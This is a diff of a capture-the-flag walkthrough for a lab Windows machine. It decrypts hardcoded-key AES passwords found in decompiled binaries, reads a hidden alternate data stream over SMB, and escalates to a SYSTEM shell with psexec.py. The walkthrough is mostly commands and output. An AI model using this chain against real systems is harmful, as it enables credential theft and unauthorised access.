@@ -232,7 +232,7 @@ smb://10.129.149.154/Secure$/IT/Carl/VB Projects/WIP/RU/RUScanner.sln
 Downloaded 25.18kB in 20 seconds
 ```
 
-Opened the RUScanner Utils file
+Opened the `Utils` class from the RUScanner application, which handles encryption and decryption.
 
 ```vbs
 ﻿Imports System.Text
@@ -353,9 +353,14 @@ Public Class Utils
 
 ```
 
-We get to see how the decrpyt function works 
+**Key Takeaway:**
+* The encryption/decryption uses AES-CBC mode.
 
-Took the decrypt script and modified it to decrypt the password I got earlier
+* Key is derived via PBKDF2 with a passphrase "N3st22", salt "88552299", 2 iterations, and IV "464R5DFA5DL6LE28".
+
+* Key size is 256 bits
+
+I translated the decrypt logic into a bash script using Python for decryption:
 
 ```bash
 nano decrypt.sh
@@ -380,6 +385,8 @@ plaintext = decrypted[:-decrypted[-1]]
 print(plaintext.decode("ascii"))
 EOF
 ```
+Make executable and run:
+
 
 ```bash
 chmod +x decrypt.sh
@@ -387,6 +394,7 @@ chmod +x decrypt.sh
 xRxRxPANCAK3SxRxRx
 ```
 
+Used the decrypted password to access the SMB share for user C.Smith:
 
 ```bash
 smbclient //10.129.149.154/Users -U C.Smith 
@@ -402,6 +410,8 @@ smb: \> ls
   TempUser                            D        0  Wed Aug  7 17:55:56 2019
 
 ```
+Downloaded user.txt and discovered Debug Mode Password.txt:Password alternate data stream:
+
 
 ```bash
 smb: \C.Smith\> ls
@@ -412,8 +422,7 @@ smb: \C.Smith\> ls
 
 
 smb: \C.Smith\> get user.txt
-```
-```
+
 smb: \C.Smith\HQK Reporting\> allinfo "Debug Mode Password.txt"
 altname: DEBUGM~1.TXT
 create_time:    Thu Aug  8 06:06:12 PM 2019 CDT
@@ -425,12 +434,16 @@ stream: [::$DATA], 0 bytes
 stream: [:Password:$DATA], 15 bytes
 smb: \C.Smith\HQK Reporting\> get "Debug Mode Password.txt:Password"
 getting file \C.Smith\HQK Reporting\Debug Mode Password.txt:Password of size 15 as Debug Mode Password.txt:Password (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+```
+Content of password:
 
+```bash
 cat 'Debug Mode Password.txt:Password'
 WBQ201953D8w 
 
 ```
-Connected to the service using telnet:
+Connected to service on port 4386:
+
 
 ```bash
 telnet 10.129.149.154 4386
@@ -456,6 +469,7 @@ HELP <Command>
 Debug mode enabled. Use the HELP command to view additional commands that are now available
 
 ```
+Explored directories and queries:
 
 
 ```bash
@@ -489,8 +503,10 @@ Use the query ID numbers below with the RUNQUERY command and the directory names
 [1]   HqkLdap.exe
 [2]   Ldap.conf
 ```
+Output from SHOWQUERY 2 revealed LDAP credentials with encrypted password:
 
-```bash
+
+```ini
 >SHOWQUERY 2
 
 Domain=nest.local
@@ -499,6 +515,9 @@ BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=local
 User=Administrator
 Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=
 ```
+
+
+Using ilspycmd to decompile HqkLdap.exe revealed a similar encryption scheme but with different parameters:
 
 ```bash
 ilspycmd -o DecompiledOutput/ "HqkLdap.exe"
@@ -532,6 +551,7 @@ public class CR
 		}
 ````
 
+Created a similar decrypt script for LDAP password:
 
 ```bash
 #!/bin/bash
@@ -565,10 +585,16 @@ print(plaintext.decode("ascii", errors="ignore"))
 EOF
 
 ```
+
+Run the script:
+
 ```bash
 ./decrypt.sh "yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4="
 XtH4nkS4Pl4y1nGX
 ```
+
+Used the decrypted password to get a SYSTEM shell with Impacket’s psexec.py:
+
 
 ```bash
 psexec.py administrator:XtH4nkS4Pl4y1nGX@10.129.149.154
@@ -587,6 +613,7 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 C:\Windows\system32> whoami
 nt authority\system
 ```
+Navigated to Administrator desktop and retrieved the root flag:
 
 ```bash
 C:\Users\Administrator\Desktop> dir
@@ -602,7 +629,7 @@ C:\Users\Administrator\Desktop> dir
                2 Dir(s)   7,534,522,368 bytes free
 
 C:\Users\Administrator\Desktop> type root.txt
-af940f193b9cb3e132351aa3365f129c
+af940f193b9cbXXXXX51aa3365f129c
 
 ````
 
